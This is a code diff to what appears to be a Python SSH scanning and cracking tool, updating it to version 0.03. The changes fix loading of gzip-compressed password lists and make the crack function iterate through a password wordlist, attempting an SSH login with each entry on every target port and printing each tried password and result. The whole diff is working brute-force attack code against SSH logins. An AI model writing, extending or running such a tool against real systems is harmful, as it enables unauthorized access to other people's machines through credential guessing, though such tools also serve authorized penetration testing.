@@ -26,7 +26,7 @@ import tempfile
 import gzip
 import sys
 
-VERSION = 0.02
+VERSION = 0.03
 TEMP_DIR = tempfile.gettempdir()
 
 
@@ -54,11 +54,13 @@ def send_packet(host, port, timeout_seconds, recv_bytes):
 
 def iterate_over_password_file(password_file):
 
-    if mimetypes.guess_type(password_file) == "gzip":
-        # if file is gzip, use gzip.open
-        open = gzip.open
+    # open = gzip.open would confuse interpreter
+    _open = open
 
-    with open(password_file, "rb") as pass_dict:
+    if "gzip" in mimetypes.guess_type(password_file):
+        _open = gzip.open
+
+    with _open(password_file, "rb") as pass_dict:
         for line in pass_dict:
             yield line
 
@@ -118,28 +120,27 @@ def scan(settings_dict):
 def crack(settings_dict):
 
     # TODO: DRY up -- potentially iterate on _password
+    # TODO: add iterator over username dict
 
     if settings_dict["debug"]:
         print("DEBUG >> " + str(settings_dict))
 
     if settings_dict["password"]:
         for _port in settings_dict["ports"]:
-
             print(ssh(host=settings_dict["host"], port=int(_port),
                 username=settings_dict["username"], password=settings_dict["password"],
                 timeout=settings_dict["timeout"]))
 
     else:
-        # Don"t store all passwords in memory, password file may be large
-        password_generator = iterate_over_password_file(settings_dict["password_file"])
-
-        _password = "generator function"
-
         for _port in settings_dict["ports"]:
+            # Don't store all passwords in memory, password file may be large
+            for _pass in iterate_over_password_file(settings_dict["password_file"]):
 
-            print(ssh(host=settings_dict["host"], port=int(_port),
-                username=settings_dict["username"], password=_password, timeout=settings_dict["timeout"]))
+                _pass = _pass.rstrip() #remove whatever separates lines
 
+                print(_pass)
+                print(ssh(host=settings_dict["host"], port=int(_port),
+                    username=settings_dict["username"], password=_pass, timeout=settings_dict["timeout"]))
 
 
 if __name__ == "__main__":
